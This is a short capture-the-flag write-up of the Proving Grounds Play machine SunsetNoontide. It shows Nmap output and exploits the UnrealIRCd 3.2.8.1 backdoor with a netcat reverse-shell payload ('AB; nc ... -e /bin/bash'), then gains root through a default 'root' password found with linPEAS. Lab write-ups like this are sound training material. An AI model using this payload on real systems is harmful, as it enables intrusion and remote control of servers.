---
title: "PG Play: SunsetNoontide"
created: "2023-09-11"
updated: "2026-04-11"
type: ctf-writeup
platform: Proving Grounds Play
machine: "SunsetNoontide"
os: Linux
status: rooted
tags:
  - - proving-grounds
  - pg-play
  - linux
  - ctf
  - oscp
  - linpeas
  - netcat
related:
  - "[[Linux-PrivEsc-Decision-Tree]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Play: SunsetNoontide

> **Platform:** Proving Grounds Play | **OS:** Linux | **Date:** 2023-09-11

---

## Quick Summary

**Open Ports:**
- 6667/tcp (irc)
- 6697/tcp (irc)
- 8067/tcp (irc)

**Key Techniques:**
- LinPEAS
- Netcat

**Privilege Escalation Path:**
- (See walkthrough)

---

## Full Walkthrough

Proving grounds Play - SunsetNoontide CTF writeup.

## Nmap

```sh
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
| irc-info: 
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.foonet.com
|   version: Unreal3.2.8.1. irc.foonet.com 
|   uptime: 205 days, 6:52:38
|   source ident: nmap
|   source host: 46E8C50E.C2311716.EA8777A3.IP
|_  error: Closing Link: aguqweprx[192.168.45.209] (Quit: aguqweprx)
Service Info: Host: irc.foonet.com6697/tcp open  irc     UnrealIRCd
8067/tcp open  irc     UnrealIRCd (Admin email example@example.com)
```

## Unreal3.2.8.1. irc.foonet.com

The Unreal3.2.8.1. irc.foonet.com is vulnerable to remote code execution. The simple way to exploit the vulnerability is to send OS commands follwed by the `AB;` string.

### Exploitation

Connect to the PORT using netcat. Make sure to run netcat listener on PORT 1234.

```sh
# connect to PORT 
nc -nv $IP 6667

# send payload after connection
AB; nc 192.168.45.209 1234 -e /bin/bash
```

**Initial Foothold Obtained**


## Privilege Escalation

Download and run [linPEAS](https://github.com/carlospolop/PEASS-ng/releases/download/20230910-ae32193f/linpeas.sh).

The results shows the root user access can be obtained by switching to root using password as `root`.

---

## Technique Links

- [[Linux-PrivEsc-Decision-Tree]]
- [[Nmap-Enumeration-Methodology]]
- [[Proving-Grounds-Master-Index]]
